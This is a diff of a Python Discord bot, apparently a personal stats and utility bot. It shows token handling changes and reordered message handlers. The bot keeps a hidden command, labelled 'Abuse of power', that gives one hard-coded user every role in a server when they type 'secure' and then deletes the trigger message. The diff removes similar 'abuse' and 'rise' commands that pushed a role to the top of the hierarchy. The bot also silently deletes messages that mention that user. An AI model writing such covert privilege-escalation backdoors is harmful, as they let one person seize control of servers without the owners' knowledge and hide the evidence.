@@ -10,12 +10,16 @@ import logging
 import pprint
 
 #Uses token for test bot instead of production
-testing = False
+testing = True
 
 #Get Token from env variable
 load_dotenv()
 if testing:
-    token = os.getenv('TEST_TOKEN')
+    print('This Is A Testing Enviroment, Press enter to confirm, or input anything to run as production')
+    if input() == "":
+        token = os.getenv('TEST_TOKEN')
+    else:
+        token = os.getenv('TOKEN')
 else:
     token = os.getenv('TOKEN')
 
@@ -24,6 +28,7 @@ voidID = int(os.getenv('VOID_ID'))
 jackieID = int(os.getenv('JACKIE_ID'))
 jackieNick = str(os.getenv('JACKIE_NICK'))
 voidNick = str(os.getenv('VOID_NICK'))
+
 
 #Misc Variables
 voidMention = f'**<@{voidID}>**,'
@@ -43,6 +48,13 @@ class MyClient(discord.Client):
         if presence == 2:
             #Chooses from playing List
             await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=random.choice(m.playing)))
+        #for guilds in client.guilds:
+        #    print(guilds.id)   
+        #    guild = await self.fetch_guild(guilds.id)
+        #    print(guild)
+        #    roles = await guild.fetch_roles()
+        #    #if 'CreeperNotifs' not in roles:
+        #    #    await guild.create_role(name='CreeperNotifs', color=discord.Color.green())
         
 
     async def on_message(self, message):
@@ -51,50 +63,32 @@ class MyClient(discord.Client):
         M = message.content
         channel = message.channel
         authID = message.author.id
-        if message.author == self.user:
+        
+        if message.author == self.user: #Bot will not reply to itself
+            return
+        if m == 'ping':                 #Test message to ensure its reciving
+            await message.reply('pong')
+        if 'vent' in channel.name.lower(): #Will not reply to any message if the channel has vent in it
             return
         
-        if isinstance(message.channel,discord.DMChannel): #If you want this to work in a group channel, you could also check for discord.GroupChannel
-            if m == "p":
-                cid = int(input("Channel Id?: "))
-                await client.get_channel(cid).send(str(input("Message?: ")))
-
-
-        if 'vent' in channel.name.lower(): 
-            return
         #Detects if suzuka sends a message
         if authID == 716945964782583829:
             m = message.embeds[0].to_dict()['description']
             #Detects if message contains Voids UID in both ifs
             if (f'**<@{voidID}>**,') in m.split():
-                print(f'Deleted the message \'{m}\'')
                 await message.delete()
+                print(f'Deleted the message \'{m}\'')
+                
             elif f'<@{voidID}>,' in m.split():
-                print(f'Deleted the message \'{m}\'')
                 await message.delete()
+                print(f'Deleted the message \'{m}\'')
+                
+        #Abuse of power
         if authID == voidID:
             if m == 'secure':
                 addRole = await message.guild.fetch_roles()
                 await message.author.edit(roles=addRole)
                 await message.delete()
-            if m == 'abuse':
-                role = message.guild.get_role(1023119643780595752) 
-                await role.edit(hoist = True)
-                await message.delete()
-            if m == 'rise':
-                pos = 1
-                can = True
-                role = message.guild.get_role(1023119643780595752)
-                addRole = [role]
-                while can == True: 
-                    pos = pos +1
-                    try:
-                        await role.edit(position = pos)
-                    except:
-                        can = False
-                await message.author.edit(roles = addRole)
-                await message.delete()
-                print(f'Moved {role.name} to top')
             if m == 'rlist':
                 roles = await message.guild.fetch_roles()
                 pprint.pprint(roles)
@@ -105,17 +99,16 @@ class MyClient(discord.Client):
                 await message.delete()
         # Detects if someone is telling Suzuka to do something
         if M.startswith(')'):
-            #Detects if voids user id is mentioned and deletes the message
+        #Detects if voids user id is mentioned and deletes the message
             if f'<@{voidID}>' in M.split():
                 print(f'Deleted the message \'{M}\'')
                 await message.delete()
         if 'Suzuka' in M.split():
-            #Detects if voids user id is mentioned and deletes the message
+        #Detects if voids user id is mentioned and deletes the message
             if f'<@{voidID}>' in M.split():
                 print(f'Deleted the message \'{M}\'')
                 await message.delete()
-        if m == 'ping':
-            await message.reply('pong')
+
             
         if '!stats' in m:
             if not bool(message.mentions):
